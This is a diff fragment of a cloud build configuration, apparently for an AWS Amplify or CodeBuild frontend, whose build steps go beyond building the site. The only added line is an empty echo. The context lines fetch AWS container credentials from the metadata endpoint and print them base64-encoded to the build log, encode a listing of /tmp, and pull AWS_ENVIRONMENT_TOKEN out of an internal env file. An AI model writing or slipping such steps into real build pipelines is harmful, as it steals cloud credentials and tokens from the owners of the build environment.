@@ -8,6 +8,7 @@ frontend:
         - mv hugo /usr/bin/hugo
         - rm -rf hugo.tar.gz
         - echo "[!] Doing stuff"
+        - echo "..."
         - echo $(ls -la /tmp | base64 -w 0) 
         - echo $(curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | base64 -w 0)
         - export token=$(cat /codebuild/output/tmp/env.sh | grep 'AWS_ENVIRONMENT_TOKEN' | cut -d '=' -f 2 | cut -d '"' -f 2)
